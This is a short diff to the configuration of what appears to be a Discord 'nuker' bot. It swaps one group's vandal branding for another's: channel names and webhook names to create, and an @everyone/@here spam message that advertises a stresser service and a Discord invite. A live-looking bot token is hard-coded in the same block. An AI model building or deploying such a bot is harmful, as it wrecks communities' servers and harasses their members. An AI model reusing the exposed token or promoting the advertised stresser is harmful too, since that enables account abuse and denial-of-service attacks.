@@ -13,9 +13,9 @@ client = commands.Bot(command_prefix=".", intents = discord.Intents.all())
 ######################################setup########################################
 
 token = 'MTI0MTc1OTgxNTY5MzI0MjQwMA.Gnw206.shFvLddxc9edVcMVZsOYZD7L2nxrAKKKZ0mrAo'
-channel_names = ['Fucked by Ace','fucked by hotshop']
-message_spam = ['@everyone nuked by Ace/HøT Shop fuck this shit discord.gg/hotshop ']
-webhook_names = ['Fucked by HøT shop', 'Ace got you','HøT Shop RunZ You ', 'Ace Here','Ace fucking this server']
+channel_names = ['galaxyc2','fucked by galaksi','vhs owns u']
+message_spam = ['@everyone @here https://discord.gg/peS3VB8mAM best str3ss3r/bombamod']
+webhook_names = ['Fucked by galaksi','vhstopka']
 
 ###################################################################################
 @client.event
